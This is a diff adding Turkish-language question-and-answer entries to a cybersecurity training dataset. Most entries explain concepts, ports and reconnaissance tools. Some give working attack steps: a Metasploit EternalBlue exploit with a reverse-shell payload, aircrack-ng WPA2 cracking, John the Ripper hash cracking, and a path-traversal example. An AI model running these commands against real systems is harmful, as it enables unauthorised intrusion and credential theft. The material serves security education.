@@ -923,4 +923,1085 @@
   "örnek": "`../../etc/passwd` gibi bir yol ile sunucudaki hassas sistem dosyasına erişilmesi.",
   "çözüm": "Kullanıcı girdilerinden dosya yolu oluşturulmamalı. Gerçek dizin kontrolü yapılmalı ve path temizlenmelidir."
 },
+  {
+    "etiket": "Threat Hunting",
+    "konu": "Aktif Tehdit Avcılığı",
+    "soru": "Threat Hunting ile log analizi arasında ne fark vardır?",
+    "cevap": "Log analizi genellikle olaylar gerçekleştikten sonra yapılırken, Threat Hunting, henüz algılanmamış tehditleri proaktif şekilde aramayı hedefler. Bu süreç genellikle hipotez tabanlıdır ve tehdit istihbaratı ile desteklenir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Red Team Infrastructure",
+    "konu": "C2 Framework Kullanımı",
+    "soru": "C2 sunucusu nedir, neden gizlenmelidir?",
+    "cevap": "C2 (Command and Control) sunucusu, saldırganın hedef sistem üzerindeki zararlı yazılım ile iletişim kurmasını sağlar. Tespiti engellemek için gizlenmesi veya trafik şifrelenerek iletilmesi gerekir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Adversary Emulation",
+    "konu": "APT Simülasyonları",
+    "soru": "Adversary Emulation ne amaçla kullanılır?",
+    "cevap": "Adversary Emulation, gerçek dünya APT (Advanced Persistent Threat) gruplarının davranışlarını taklit ederek savunma sistemlerini test etmeyi amaçlar. MITRE ATT&CK çerçevesine uygun test senaryoları oluşturulur.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Deception Technology",
+    "konu": "Aldatma Teknolojileri",
+    "soru": "Deception teknolojileri siber güvenlikte nasıl kullanılır?",
+    "cevap": "Deception teknolojileri, saldırganların dikkatini gerçek sistemlerden uzaklaştırmak için honeypot, honeynet ve tuzak sistemler kullanır. Bu sayede saldırganların davranışları izlenebilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Supply Chain Attacks",
+    "konu": "Tedarik Zinciri Saldırıları",
+    "soru": "Bir supply chain saldırısı nasıl işler?",
+    "cevap": "Tedarik zinciri saldırılarında hedef sistem yerine, o sisteme yazılım veya hizmet sağlayan başka bir sistem ele geçirilir. Bu şekilde hedef sisteme dolaylı yoldan sızılır. SolarWinds saldırısı buna örnektir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Living off the Land (LotL)",
+    "konu": "Yerel Araçlarla Saldırı",
+    "soru": "LotL saldırıları neden tespiti zordur?",
+    "cevap": "LotL saldırılarında PowerShell, WMI gibi sistemde doğal olarak bulunan araçlar kullanılır. Bu araçlar zararsız göründüğü için geleneksel güvenlik sistemleri tarafından gözden kaçırılabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Zero Trust Architecture",
+    "konu": "Güvenilmeyen Ağ Modeli",
+    "soru": "Zero Trust nedir ve neyi amaçlar?",
+    "cevap": "Zero Trust, hiçbir kullanıcının ya da cihazın varsayılan olarak güvenilmediği bir güvenlik yaklaşımıdır. Erişim talepleri sürekli olarak doğrulanır ve en az ayrıcalık prensibi uygulanır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Cloud Security",
+    "konu": "Bulut Bilişim Güvenliği",
+    "soru": "Cloud misconfigurations neden önemli bir güvenlik açığıdır?",
+    "cevap": "Yanlış yapılandırmalar (misconfiguration), hassas verilerin yanlışlıkla internete açık bırakılmasına neden olabilir. AWS S3 bucket'larının yanlış yapılandırılması buna örnektir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Digital Forensics",
+    "konu": "Adli Bilişim",
+    "soru": "Volatility aracı ile bellek analizinde hangi bulgular elde edilebilir?",
+    "cevap": "Volatility, RAM'den alınan bellek dökümünde çalışan işlemler, açık portlar, network bağlantıları, yüklenmiş modüller, kullanıcı etkinlikleri gibi pek çok dijital delili ortaya çıkarabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Binary Exploitation",
+    "konu": "İkili Açıklardan Yararlanma",
+    "soru": "Buffer Overflow saldırısı nedir, nasıl gerçekleşir?",
+    "cevap": "Buffer Overflow, bellekte ayrılan alanın dışına taşan verilerle sistemin kontrol akışının ele geçirilmesidir. Bu açıkla zararlı kod çalıştırılabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Firmware Attacks",
+    "konu": "Donanım Seviyesi Saldırılar",
+    "soru": "Firmware saldırıları neden tehlikelidir?",
+    "cevap": "Firmware saldırıları BIOS/UEFI gibi düşük seviyeli yazılımları hedef alır. Sistem yeniden kurulduğunda bile saldırgan kontrolü elinde tutabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Offensive OSINT",
+    "konu": "Saldırı Amaçlı Açık Kaynak İstihbaratı",
+    "soru": "OSINT saldırı aşamasında nasıl kullanılır?",
+    "cevap": "Açık kaynaklardan elde edilen bilgiler (e-posta, IP, domain, sosyal medya vs.) hedef hakkında keşif yapmak, phishing veya password spraying gibi saldırıları özelleştirmek için kullanılır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "ICS/SCADA Security",
+    "konu": "Endüstriyel Kontrol Sistemleri Güvenliği",
+    "soru": "SCADA sistemleri neden farklı güvenlik önlemleri gerektirir?",
+    "cevap": "SCADA sistemleri genellikle eski protokolleri ve donanımları kullanır, yamalar nadiren uygulanır. Bu da onları hedefli saldırılara açık hale getirir. Fiziksel güvenlik ve süreklilik kritik öneme sahiptir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Windows Internals",
+    "konu": "Windows İç Yapısı ve Güvenlik Açıkları",
+    "soru": "LSASS process nedir ve neden saldırganlar tarafından hedef alınır?",
+    "cevap": "LSASS (Local Security Authority Subsystem Service), kimlik bilgilerini işler. Saldırganlar Mimikatz gibi araçlarla bu işlemi dump ederek şifreleri elde edebilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Advanced Persistence",
+    "konu": "İleri Seviye Kalıcılık Yöntemleri",
+    "soru": "APT grupları kalıcılığı nasıl sağlar?",
+    "cevap": "Regedit girişleri, servis oluşturma, DLL hijacking, scheduled task ve WMI event subscription gibi tekniklerle sistem yeniden başlasa bile erişimi korurlar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Cryptographic Attacks",
+    "konu": "Kriptografi Tabanlı Saldırılar",
+    "soru": "Padding Oracle Attack nedir?",
+    "cevap": "Şifrelenmiş verilerde padding hatalarının yanıtlarına göre içerik hakkında bilgi elde edilmesini sağlayan bir saldırıdır. CBC modundaki uygulamalarda görülebilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "AI in Cybersecurity",
+    "konu": "Yapay Zeka Destekli Güvenlik",
+    "soru": "Yapay zeka siber tehditlerin tespitinde nasıl kullanılır?",
+    "cevap": "Makine öğrenimi algoritmaları anomali tespiti, zararlı yazılım sınıflandırma, kullanıcı davranış analizi ve otomatik yanıt sistemleri için kullanılır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "ISO/IEC 27001",
+    "konu": "Bilgi Güvenliği Yönetim Sistemi (BGYS)",
+    "soru": "ISO/IEC 27001 nedir ve bir kuruluş için neden önemlidir?",
+    "cevap": "ISO/IEC 27001, bilgi güvenliğini yönetmek ve riski azaltmak amacıyla geliştirilen uluslararası bir standarttır. Kuruluşların güvenlik politikaları, risk yönetimi ve sürekli iyileştirme süreçlerini kapsar.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "ISO/IEC 27002",
+    "konu": "Bilgi Güvenliği Kontrolleri",
+    "soru": "ISO/IEC 27002 ile 27001 arasındaki fark nedir?",
+    "cevap": "27002, 27001’de tanımlanan kontrollerin nasıl uygulanacağını detaylandırır. Yani 27001 ne yapılması gerektiğini, 27002 nasıl yapılacağını açıklar.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "ISO/IEC 27005",
+    "konu": "Bilgi Güvenliği Risk Yönetimi",
+    "soru": "ISO/IEC 27005 standardı hangi süreci yönetmeye yöneliktir?",
+    "cevap": "ISO/IEC 27005, bilgi güvenliği risk yönetimini ele alır. Tehdit, zafiyet, etki gibi kavramlarla risk değerlendirme ve tedbir belirleme süreçlerini kapsar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "ISO/IEC 27701",
+    "konu": "Gizlilik Bilgi Yönetimi Sistemi (PIMS)",
+    "soru": "ISO/IEC 27701 neden GDPR ile birlikte anılır?",
+    "cevap": "ISO/IEC 27701, ISO/IEC 27001 üzerine kurulmuş gizlilik odaklı bir uzantıdır ve GDPR gibi veri koruma düzenlemeleriyle uyumluluğu sağlamada kullanılır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "ISO/IEC 22301",
+    "konu": "İş Sürekliliği Yönetimi",
+    "soru": "Siber saldırı sonrası iş sürekliliği neden ISO 22301 ile ilişkilidir?",
+    "cevap": "ISO 22301, kuruluşların siber saldırı, doğal afet gibi kesintilere karşı hazırlıklı olmasını ve kritik süreçlerin sürekliliğini sağlamasını hedefler.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Port - 21",
+    "konu": "FTP (File Transfer Protocol)",
+    "soru": "21 numaralı port hangi amaçla kullanılır?",
+    "cevap": "21 numaralı port FTP bağlantıları için kullanılır. Genellikle dosya aktarımı amacıyla kullanılır ve şifrelenmemiş veri gönderimi yapar.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Port - 22",
+    "konu": "SSH (Secure Shell)",
+    "soru": "22 numaralı portun güvenlik açısından önemi nedir?",
+    "cevap": "22 numaralı port, uzak sistemlere güvenli bağlantı kurmak için kullanılır. SSH ile veri şifreli şekilde iletilir ve sistem yönetimi yapılabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Port - 23",
+    "konu": "Telnet",
+    "soru": "23 numaralı port neden güvensiz olarak kabul edilir?",
+    "cevap": "Telnet şifreleme kullanmaz, bu yüzden iletilen veriler düz metin olarak gider. Bu da şifrelerin kolayca ele geçirilmesine neden olur.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Port - 25",
+    "konu": "SMTP (Simple Mail Transfer Protocol)",
+    "soru": "25 numaralı port ne için kullanılır?",
+    "cevap": "SMTP, e-posta iletimi için kullanılır. Ancak spam saldırıları ve sahtecilikler için kötüye kullanılabilir.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Port - 53",
+    "konu": "DNS (Domain Name System)",
+    "soru": "53 numaralı port üzerinden ne tür trafik geçer?",
+    "cevap": "DNS sorguları UDP üzerinden 53 numaralı portla gönderilir. Bazı durumlarda TCP de kullanılabilir.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Port - 80",
+    "konu": "HTTP (HyperText Transfer Protocol)",
+    "soru": "80 numaralı port ne işe yarar?",
+    "cevap": "HTTP trafiği için kullanılır ve web tarayıcıları bu port üzerinden sitelere bağlanır. Ancak şifreleme yoktur.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Port - 443",
+    "konu": "HTTPS (HTTP Secure)",
+    "soru": "443 numaralı port neden güvenli olarak kabul edilir?",
+    "cevap": "HTTPS trafiği bu port üzerinden geçer. TLS/SSL ile şifreleme sağlandığı için veriler güvenli iletilir.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Port - 3389",
+    "konu": "RDP (Remote Desktop Protocol)",
+    "soru": "3389 numaralı port neden saldırganlar tarafından hedef alınır?",
+    "cevap": "Uzak masaüstü erişimini sağlar. Brute force saldırıları ve zafiyet istismarı için hedef alınabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Port - 445",
+    "konu": "SMB (Server Message Block)",
+    "soru": "445 numaralı port ile ilişkili en bilinen saldırı nedir?",
+    "cevap": "EternalBlue zafiyeti (WannaCry gibi) SMBv1 üzerinden 445 portunu hedef alarak yayılmıştır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Port - 3306",
+    "konu": "MySQL Database",
+    "soru": "3306 portu açık bırakılırsa ne gibi riskler oluşur?",
+    "cevap": "3306 portu üzerinden MySQL veritabanına bağlantı sağlanır. Port internete açık bırakılırsa yetkisiz erişim ve veri sızıntısı riski oluşur.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Port - 5432",
+    "konu": "PostgreSQL Database",
+    "soru": "5432 numaralı port hangi servise aittir ve neden korunmalıdır?",
+    "cevap": "PostgreSQL veritabanı bağlantıları 5432 portu üzerinden gerçekleşir. Şifrelenmemiş bağlantılar saldırılara açıktır, bu yüzden güvenlik duvarı ve VPN ile korunmalıdır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Port - 389",
+    "konu": "LDAP (Lightweight Directory Access Protocol)",
+    "soru": "LDAP protokolü hangi port üzerinden çalışır ve şifreleme kullanır mı?",
+    "cevap": "LDAP genellikle 389 portunu kullanır, ancak varsayılan olarak şifreleme kullanmaz. Şifreli versiyonu için 636 portu (LDAPS) tercih edilmelidir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Port - 161",
+    "konu": "SNMP (Simple Network Management Protocol)",
+    "soru": "SNMP'nin 161 portu üzerinden çalışmasının güvenlik riskleri nelerdir?",
+    "cevap": "SNMP, sistem izleme için kullanılır ancak varsayılan community string'leri değiştirilmediğinde cihazlar kontrolsüz şekilde ele geçirilebilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Port - 69",
+    "konu": "TFTP (Trivial File Transfer Protocol)",
+    "soru": "TFTP neden güvenli olmayan bir protokol olarak kabul edilir?",
+    "cevap": "TFTP, kimlik doğrulama ve şifreleme içermediğinden kötü niyetli dosya aktarımı ve bilgi sızdırma riskleri taşır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Port - 5900",
+    "konu": "VNC (Virtual Network Computing)",
+    "soru": "5900 portu hangi servis için kullanılır ve saldırılara nasıl açıktır?",
+    "cevap": "VNC uzak masaüstü bağlantıları için kullanılır. Zayıf şifreleme ve default parolalar saldırı vektörü olabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Port - 8080",
+    "konu": "HTTP Alternative Port",
+    "soru": "8080 portu genellikle hangi amaçla kullanılır?",
+    "cevap": "8080 portu, HTTP servislerinin alternatif olarak barındırılması için kullanılır. Açık bırakıldığında gölgede kalan web uygulamaları risk oluşturabilir.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Port - 137-139",
+    "konu": "NetBIOS",
+    "soru": "NetBIOS portları (137-139) neden güvenlik açığı oluşturur?",
+    "cevap": "Windows ağ paylaşım servisleri bu portları kullanır. Açık bırakıldığında bilgi sızması ve kimlik doğrulama saldırılarına açıktır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Aktif Bilgi Toplama - Nmap",
+    "konu": "Port Tarama",
+    "soru": "Nmap aracı ile hangi bilgiler elde edilebilir?",
+    "cevap": "Nmap ile hedef sistemin açık portları, çalışan servisleri, işletim sistemi tahmini ve versiyon bilgileri gibi detaylar elde edilebilir.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Aktif Bilgi Toplama - Netcat",
+    "konu": "Banner Grabbing",
+    "soru": "Netcat (nc) aracı ile banner grabbing nasıl yapılır?",
+    "cevap": "Netcat ile belirli bir IP ve port'a bağlanarak servislerin başlangıçta gönderdiği banner bilgileri alınabilir. Örneğin: `nc example.com 80` komutu ile HTTP banner alınabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Aktif Bilgi Toplama - Nikto",
+    "konu": "Web Güvenlik Açığı Taraması",
+    "soru": "Nikto aracı hangi amaçla kullanılır?",
+    "cevap": "Nikto, hedef web sunucusunun güvenlik açıklarını (varsayılan dizinler, zayıf konfigürasyonlar, eski yazılımlar) taramak için kullanılır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Aktif Bilgi Toplama - Dirb",
+    "konu": "Dizin Keşfi",
+    "soru": "Dirb aracı ile neler keşfedilebilir?",
+    "cevap": "Dirb, hedef web sitesinde gizli dizin ve dosyaları keşfetmek için sözlük tabanlı dizin taraması yapar.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Aktif Bilgi Toplama - WhatWeb",
+    "konu": "Web Teknoloji Tespiti",
+    "soru": "WhatWeb aracı ne işe yarar?",
+    "cevap": "WhatWeb, bir web sitesinin arka planda kullandığı teknolojileri (CMS, sunucu yazılımı, analiz araçları) tespit etmek için kullanılır.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Aktif Bilgi Toplama - Wappalyzer",
+    "konu": "Tarayıcı Eklentisi ile Bilgi Toplama",
+    "soru": "Wappalyzer ile hangi bilgiler elde edilir?",
+    "cevap": "Wappalyzer, ziyaret edilen sitelerin hangi framework, CMS ve kütüphaneleri kullandığını tarayıcı üzerinde analiz eder.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Aktif Bilgi Toplama - Xray",
+    "konu": "Otomatik Güvenlik Tarayıcısı",
+    "soru": "Xray aracı ne için kullanılır?",
+    "cevap": "Xray, web uygulamalarında SQLi, XSS gibi açıklıkları tespit edebilen aktif güvenlik tarama aracıdır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Aktif Bilgi Toplama - Burp Suite",
+    "konu": "Web Proxy ile Aktif Tarama",
+    "soru": "Burp Suite nasıl aktif bilgi toplama amacıyla kullanılır?",
+    "cevap": "Burp Suite, web trafiğini yakalayarak ve değiştirerek güvenlik zafiyetlerini tespit etmek için kullanılır. Aktif tarama modları ile saldırılar simüle edilebilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Pasif Bilgi Toplama - WHOIS",
+    "konu": "Alan Adı Bilgisi",
+    "soru": "WHOIS sorgusu ile ne tür bilgiler elde edilir?",
+    "cevap": "WHOIS sorgusu ile bir alan adının kime ait olduğu, kayıt tarihi, güncelleme tarihi ve kayıt firması gibi bilgiler elde edilir.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Pasif Bilgi Toplama - NSLookup",
+    "konu": "DNS Bilgisi",
+    "soru": "NSLookup aracı ne işe yarar?",
+    "cevap": "NSLookup, bir domainin IP adresi, DNS kayıtları ve alt alan adları gibi bilgilerini elde etmek için kullanılır.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Pasif Bilgi Toplama - TheHarvester",
+    "konu": "E-posta ve Alan Adı Tespiti",
+    "soru": "TheHarvester aracı ne için kullanılır?",
+    "cevap": "TheHarvester, internet üzerindeki açık kaynaklardan e-posta adresleri, alan adları ve IP bilgilerini toplamak için kullanılır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Pasif Bilgi Toplama - Shodan",
+    "konu": "Cihaz Keşfi",
+    "soru": "Shodan aracı hangi bilgileri sağlar?",
+    "cevap": "Shodan, internete bağlı cihazların IP'lerini, açık portlarını, hizmet bilgilerini ve konumlarını gösterir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Pasif Bilgi Toplama - Censys",
+    "konu": "Sertifika ve Servis Bilgisi",
+    "soru": "Censys ile neler analiz edilebilir?",
+    "cevap": "Censys, SSL/TLS sertifikaları, servis sürümleri ve ağ hizmetleri gibi güvenlikle ilgili birçok veriyi pasif olarak sunar.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Pasif Bilgi Toplama - Google Dorking",
+    "konu": "Arama Motoru Tabanlı Bilgi Toplama",
+    "soru": "Google Dorking nedir?",
+    "cevap": "Google Dorking, gelişmiş arama operatörleri kullanarak web sitelerinde açıkta kalan verilerin bulunmasına yarar. Örnek: `site:example.com filetype:pdf`",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Pasif Bilgi Toplama - Recon-ng",
+    "konu": "OSINT Framework",
+    "soru": "Recon-ng aracı ne işe yarar?",
+    "cevap": "Recon-ng, modüler bir OSINT (Açık Kaynak İstihbarat) çerçevesidir. Domain, kullanıcı adı, sosyal medya ve daha birçok kaynaktan bilgi toplar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Pasif Bilgi Toplama - Maltego",
+    "konu": "İlişki Haritalama",
+    "soru": "Maltego hangi amaçla kullanılır?",
+    "cevap": "Maltego, kişi, kurum, domain, IP ve sosyal medya gibi varlıklar arasında ilişkileri görsel olarak analiz etmeye yarayan bir araçtır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Tanım",
+    "konu": "Kali Linux Nedir?",
+    "soru": "Kali Linux nedir ve hangi amaçlarla kullanılır?",
+    "cevap": "Kali Linux, penetrasyon testleri ve etik hack amaçlı geliştirilmiş Debian tabanlı bir Linux dağıtımıdır. İçinde birçok güvenlik ve sızma testi aracı barındırır.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Kali Linux - Araçlar",
+    "konu": "Kali Linux İçindeki Araçlar",
+    "soru": "Kali Linux'ta hangi tür araçlar bulunur?",
+    "cevap": "Kali Linux, ağ keşfi, bilgi toplama, zafiyet tarama, parola kırma, sosyal mühendislik, exploit geliştirme ve daha birçok alanda kullanılan yüzlerce araca sahiptir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Kali Linux - Kurulum",
+    "konu": "Kali Linux Kurulumu",
+    "soru": "Kali Linux nasıl kurulur ve sistem gereksinimleri nelerdir?",
+    "cevap": "Kali Linux, ISO imajı aracılığıyla USB, sanal makine veya doğrudan bilgisayara kurulabilir. Minimum 2 GB RAM ve 20 GB disk alanı önerilir. Kurulum rehberi Kali resmi sitesinde mevcuttur.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Kali Linux - Güncelleme",
+    "konu": "Kali Linux Güncelleme",
+    "soru": "Kali Linux nasıl güncellenir?",
+    "cevap": "Kali Linux'ta 'sudo apt update' ve 'sudo apt upgrade' komutları ile sistem ve araçlar güncellenir. Ayrıca, 'kali-linux-default' metapackage ile temel araçlar güncel tutulur.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Kali Linux - Özelleştirme",
+    "konu": "Kali Linux Özelleştirme",
+    "soru": "Kali Linux sistemini nasıl özelleştirebilirim?",
+    "cevap": "Kali Linux, masaüstü ortamları, araç setleri ve temalar açısından esnektir. Ayrıca, kendi araçlarınızı ekleyebilir veya gereksiz araçları kaldırabilirsiniz.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Kullanım Senaryoları",
+    "konu": "Penetrasyon Testi Senaryoları",
+    "soru": "Kali Linux hangi penetrasyon testi senaryolarında tercih edilir?",
+    "cevap": "Kali Linux, ağ güvenliği testleri, web uygulama güvenliği, sosyal mühendislik, parola kırma, kablosuz ağ saldırıları ve zafiyet analizlerinde yaygın olarak kullanılır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Legal Uyarı",
+    "konu": "Kali Linux Kullanımı ve Yasal Sorumluluklar",
+    "soru": "Kali Linux kullanırken nelere dikkat edilmeli?",
+    "cevap": "Kali Linux etik amaçlar için kullanılmalıdır. İzin alınmadan yapılan sızma testleri veya saldırılar yasadışıdır ve hukuki yaptırımlara yol açar.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Kali Linux - Nmap",
+    "konu": "Nmap Komutu",
+    "soru": "Kali Linux'ta Nmap komutuyla ağ taraması nasıl yapılır?",
+    "cevap": "Nmap, ağ keşfi ve güvenlik taraması için kullanılan güçlü bir araçtır. Örnek komut: 'nmap -sS -p 1-65535 192.168.1.1' tüm portları SYN taraması ile tarar.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Kali Linux - Metasploit",
+    "konu": "Metasploit Framework",
+    "soru": "Metasploit nedir ve Kali Linux'ta nasıl kullanılır?",
+    "cevap": "Metasploit, açıkları keşfetmek ve exploit geliştirmek için kullanılan bir framework'tür. 'msfconsole' komutuyla başlatılır ve modüller aracılığıyla hedef sistemlere saldırı düzenlenir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Wireshark",
+    "konu": "Wireshark ile Paket Analizi",
+    "soru": "Wireshark aracı Kali Linux'ta nasıl kullanılır?",
+    "cevap": "Wireshark, ağ trafiğini gerçek zamanlı olarak analiz etmek için kullanılır. 'wireshark' komutu ile açılır, filtreler ve protokol analizleri yapılabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Kali Linux - John the Ripper",
+    "konu": "Parola Kırma Aracı",
+    "soru": "John the Ripper nasıl çalışır ve ne için kullanılır?",
+    "cevap": "John the Ripper, parola kırmak için kullanılan bir araçtır. Kali'de 'john' komutu ile çalışır, parola hash'lerini kırmaya çalışır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Aircrack-ng",
+    "konu": "Kablosuz Ağ Saldırıları",
+    "soru": "Aircrack-ng aracı ne işe yarar?",
+    "cevap": "Aircrack-ng, Wi-Fi şifrelerini kırmak ve kablosuz ağ trafiğini analiz etmek için kullanılır. Paket yakalama, şifre kırma ve ağ izleme özellikleri vardır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Burp Suite",
+    "konu": "Web Uygulama Güvenliği",
+    "soru": "Burp Suite aracı ne için kullanılır ve nasıl çalışır?",
+    "cevap": "Burp Suite, web uygulama güvenlik testleri için kullanılan bir proxy aracıdır. HTTP trafiğini yakalar, değiştirir ve analiz eder.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Komutlar",
+    "konu": "Önemli Kali Linux Komutları",
+    "soru": "Kali Linux'ta sık kullanılan temel komutlar nelerdir?",
+    "cevap": "'ifconfig' (ağ arayüzlerini gösterir), 'iwconfig' (kablosuz ayarları), 'airmon-ng' (monitör moduna alma), 'service' (servis yönetimi), 'apt-get' (paket yönetimi) gibi komutlar önemlidir.",
+    "seviye": "Temel"
+  },
+  {
+    "etiket": "Kali Linux - Nmap",
+    "konu": "Nmap Komutu ve İleri Seviye Kullanımı",
+    "soru": "Nmap ile hedef ağda kapsamlı bir keşif nasıl yapılır?",
+    "cevap": "Nmap ile hedef ağdaki canlı sistemleri, açık portları, servis versiyonlarını ve işletim sistemi bilgilerini tespit etmek için şu komut kullanılır:\n\nnmap -sS -sV -O -p 1-65535 192.168.1.1\n\n- '-sS': SYN taraması (yarı açık tarama)\n- '-sV': servis ve versiyon tespiti\n- '-O': işletim sistemi parmak izi\n- '-p 1-65535': tüm portları tarar\n\nBu sayede hedef hakkında detaylı bilgi toplanır ve sonraki saldırı aşamaları için planlama yapılır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Metasploit",
+    "konu": "Metasploit ile Exploit Kullanımı",
+    "soru": "Metasploit'te bir exploit nasıl seçilir ve hedefe uygulanır?",
+    "cevap": "Metasploit konsolunda öncelikle exploit modülü seçilir:\n\nuse exploit/windows/smb/ms17_010_eternalblue\n\nArdından hedef IP ayarlanır:\n\nset RHOSTS 192.168.1.10\n\nPayload belirlenir:\n\nset PAYLOAD windows/meterpreter/reverse_tcp\n\nBağlantı ayarları yapılır:\n\nset LHOST 192.168.1.5\n\nSon olarak exploit çalıştırılır:\n\nrun\n\nBu işlemle hedef sistemde Meterpreter oturumu açılarak komut çalıştırma imkanı elde edilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Wireshark",
+    "konu": "Wireshark ile Filtreleme ve Paket Analizi",
+    "soru": "Wireshark'ta HTTP trafiği nasıl filtrelenir ve analiz edilir?",
+    "cevap": "Wireshark açıldıktan sonra üstteki filtre alanına 'http' yazılarak sadece HTTP trafiği filtrelenir. Paketler üzerinde sağ tıklanıp 'Follow TCP Stream' seçilerek istek ve cevap detayları okunabilir. Ayrıca filtrelerde 'ip.addr == 192.168.1.1' gibi IP bazlı filtreler uygulanabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - John the Ripper",
+    "konu": "John the Ripper ile Karma Parola Kırma",
+    "soru": "John the Ripper ile karma (hashed) parolalar nasıl kırılır?",
+    "cevap": "Hash içeren dosya hazırlanır, örneğin 'hash.txt'. Sonra komut kullanılır:\n\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\nBu komut rockyou kelime listesini kullanarak hashleri kırmaya çalışır. Başarılı kırılan parolalar 'john --show hash.txt' ile görüntülenir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Kali Linux - Aircrack-ng",
+    "konu": "Aircrack-ng ile WPA2 Şifre Kırma",
+    "soru": "Aircrack-ng ile bir Wi-Fi ağının WPA2 şifresi nasıl kırılır?",
+    "cevap": "İlk olarak monitör modu açılır:\n\nairmon-ng start wlan0\n\nArdından hedef ağın trafiği yakalanır:\n\nairodump-ng --bssid <MAC> -c <channel> wlan0mon\n\nŞifre kırmak için:\n\naircrack-ng -w /usr/share/wordlists/rockyou.txt capturefile.cap\n\nBu süreçte, WPA2 handshake yakalanması gerekir, ardından kelime listesi ile brute force uygulanır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Active Directory",
+    "konu": "Active Directory Temel Kavramları",
+    "soru": "Active Directory nedir ve ne amaçla kullanılır?",
+    "cevap": "Active Directory (AD), Microsoft tarafından geliştirilen merkezi bir kimlik ve erişim yönetim sistemidir. Ağ üzerindeki kullanıcılar, bilgisayarlar ve diğer kaynakların yönetimini kolaylaştırır. Grup politikaları ile güvenlik ve kaynak erişimi kontrol edilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Proxy",
+    "konu": "Proxy Sunucuların Görevleri",
+    "soru": "Proxy sunucu ne işe yarar ve hangi durumlarda kullanılır?",
+    "cevap": "Proxy sunucu, istemciler ile internet arasındaki aracıdır. Güvenlik, anonimlik sağlama, erişim kontrolü ve trafik izleme amaçlarıyla kullanılır. Kurumsal ağlarda filtreleme ve hız artırma için tercih edilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Detection",
+    "konu": "Saldırı Tespit Yöntemleri",
